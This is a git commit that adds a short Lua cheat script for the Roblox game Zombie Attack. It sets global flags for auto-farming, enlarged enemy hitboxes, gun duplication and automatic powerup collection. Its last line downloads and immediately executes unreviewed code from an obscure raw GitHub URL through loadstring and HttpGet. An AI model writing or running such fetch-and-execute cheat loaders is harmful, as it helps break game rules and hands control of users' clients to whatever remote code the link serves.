f18df0d5c4a4d833b3d040211d18b6147d5b3d89
ferickinhoferreira <158114517+ferickinhoferreira@users.noreply.github.com>
2025-04-24 23:23:30 -0300

    Add files via upload

---
+++ zombie attack.lua
@@ -0,0 +1,8 @@
+_G.Settings = false
+_G.farm2 = false -- Auto Farm (true / false)
+_G.groundDistance = 0 -- Auto Farm +/- Up / Down
+_G.dist = 100000 -- Search-Zombie Distance
+_G.HeadSize = 2.5 -- Hitbox size
+_G.autoequip = false -- Auto Equip Tools + Duplicate Guns More Damage OP (true / false)
+_G.AutoGetPowerups = false -- Auto Get powerups (true / false)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dqtixz/ZXwtccwtwct4/refs/heads/main/hdfdf"))()
